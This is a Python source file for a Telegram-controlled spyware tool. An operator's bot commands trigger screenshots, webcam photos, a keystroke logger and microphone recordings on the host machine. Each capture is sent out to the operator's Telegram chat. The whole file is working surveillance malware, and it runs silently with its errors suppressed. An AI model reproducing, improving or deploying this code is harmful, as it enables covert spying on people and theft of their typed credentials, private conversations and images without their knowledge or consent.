import os
from time import sleep
import sys
import time
import telepot
import pyautogui
from telepot.loop import MessageLoop
from tokens import *
import cv2
import pyaudio
import wave
import keyboard
from threading import Semaphore, Timer



class Keylogger:
	def __init__(self, interval, chat_id):
		# we gonna pass SEND_REPORT_EVERY to interval
		self.interval = interval
		# this is the string variable that contains the log of all
		# the keystrokes within `self.interval`
		self.log = ""
		# for blocking after setting the on_release listener
		self.semaphore = Semaphore(0)
		self.chat_id = chat_id
		self.my_timer = Timer(interval=self.interval, function=self.report)
	def callback(self, event):
		"""
		This callback is invoked whenever a keyboard event is occured
		(i.e when a key is released in this example)
		"""
		name = event.name
		if len(name) > 1:
			# not a character, special key (e.g ctrl, alt, etc.)
			# uppercase with []
			if name == "space":
				# " " instead of "space"
				name = " "
			elif name == "enter":
				# add a new line whenever an ENTER is pressed
				name = "[ENTER]\n"
			elif name == "decimal":
				name = "."
			else:
				# replace spaces with underscores
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"

		self.log += name

	def send_data(self, chat_id):
		bot.sendChatAction(chat_id, 'typing')
		bot.sendMessage(chat_id, "Sending keylogger data")
		f=open('img\\newest.txt', 'rb')
		bot.sendDocument(chat_id, f)

	def report(self):
		if self.log:
			# if there is something in log, report it
			f = open("img\\newest.txt",'a+').write(self.log)
			#self.send_data()
			# can print to a file, whatever you want
			# print(self.log)
		self.log = ""

		self.semaphore.release()

	def start(self):
		keyboard.on_release(callback=self.callback)
		self.report()
		self.semaphore.acquire()
		self.my_timer.start()

	def stop(self):
		self.semaphore.release()
		self.my_timer.cancel()
		try:
			os.remove("img\\newest.txt")
		except:
			pass
class MyBot(telepot.Bot):
	def __init__(self, *args, **kwargs):
		super(MyBot, self).__init__(*args, **kwargs)
		self.answerer = telepot.helper.Answerer(self)
		self._message_with_inline_keyboard = None

	def on_chat_message(self, msg):
		content_type, chat_type, chat_id = telepot.glance(msg)

		# For debugging and get admin id
		# print(content_type, chat_type, chat_id)

		if chat_id in adminId:
			if content_type == 'text' :
				if msg['text'] == '/help':
					bot.sendChatAction(chat_id, 'typing')
					bot.sendMessage(chat_id, "Comands available :\n	/help to get the list of comands. \n	/capture get a capture of the user screen\n	/webcam get a webcam pic \n	/keylogger to activate the keylogger\n	/audio o record audio ")
				if msg['text'] == '/capture':
					bot.sendChatAction(chat_id, 'typing')
					bot.sendMessage(chat_id, "Capturing image")
					self.capture_img()
					f=open('img\\screenshot.png', 'rb')
					bot.sendDocument(chat_id, f)

				if msg['text'] == '/webcam':
					bot.sendChatAction(chat_id, 'tygeting')
					bot.sendMessage(chat_id, "Capturing webcam")
					self.capture_webcam()
					f=open('img\\webcam.png', 'rb')
					bot.sendDocument(chat_id, f)


				if '/keylogger' in msg['text']:
					if 'start' in msg['text']:
						try:
							KEYLOGGER_INTERVAL = int(msg['text'].split()[-1])
						except:
							KEYLOGGER_INTERVAL = 60
					keylogger = self.run_keylogger(KEYLOGGER_INTERVAL,chat_id)
					mode = msg['text'].split()[-1]
					if mode == 'start':
						bot.sendMessage(chat_id, "Started the keylogger")
						keylogger.start()
					if mode == 'data':
						keylogger.send_data(chat_id)
					if mode == 'clear':
						keylogger.stop()
					else:
						bot.sendChatAction(chat_id, 'typing')
						bot.sendMessage(chat_id, "Keylogger has two modes:\nkeylogger start : Starts the keylogger\nkeylogger data : Sends logged data\nkeylogger clear : Clears the keylogger")

					## TODO: STOP IT


				if '/audio' in msg['text']:
					try :
						record_seconds= int(msg['text'].split()[-1])
						if record_seconds >11:
							raise ValueError
						bot.sendChatAction(chat_id, 'typing')
						bot.sendMessage(chat_id, f"Recording audio wait {record_seconds} seconds")
						self.capture_audio(record_seconds)
						f=open('img\\recorded.wav', 'rb')
						bot.sendMessage(chat_id, f"Sending the recording")
						bot.sendDocument(chat_id, f)
					except:
						bot.sendMessage(chat_id, "Error: Format should be /audio 5 if you want to record for 5 seconds and max recording time is 10 sec")

		else:
			bot.sendMessage(chat_id, "Not admin")

	def capture_audio(self, record_seconds):
		chunk = 1024
		FORMAT = pyaudio.paInt16
		channels = 1
		sample_rate = 44100
		p = pyaudio.PyAudio()
		stream = p.open(format=FORMAT,
						channels=channels,
						rate=sample_rate,
						input=True,
						output=True,
						frames_per_buffer=chunk)
		frames = []
		print("Recording...")
		for i in range(int(44100 / chunk * record_seconds)):
			data = stream.read(chunk)
			frames.append(data)
		print("Finished recording.")
		stream.stop_stream()
		stream.close()
		p.terminate()
		wf = wave.open("img\\recorded.wav", "wb")
		wf.setnchannels(channels)
		wf.setsampwidth(p.get_sample_size(FORMAT))
		wf.setframerate(sample_rate)
		wf.writeframes(b"".join(frames))
		wf.close()
		return

	def run_keylogger(self, SEND_REPORT_EVERY, chat_id):
		keylogger = Keylogger(SEND_REPORT_EVERY, chat_id)
		return keylogger

	def capture_webcam(self):
		camera = cv2.VideoCapture(0)
		time.sleep(0.1)
		return_value, image = camera.read()
		cv2.imwrite("img\\webcam.png", image)
		del(camera)
		return

	def capture_img(self):
		pic = pyautogui.screenshot()
		pic.save('img\\screenshot.png')
		return
try:
	TOKEN = telegrambot

	bot = MyBot(TOKEN)
	MessageLoop(bot).run_as_thread()


	while 1:
		time.sleep(3)
except:
	pass
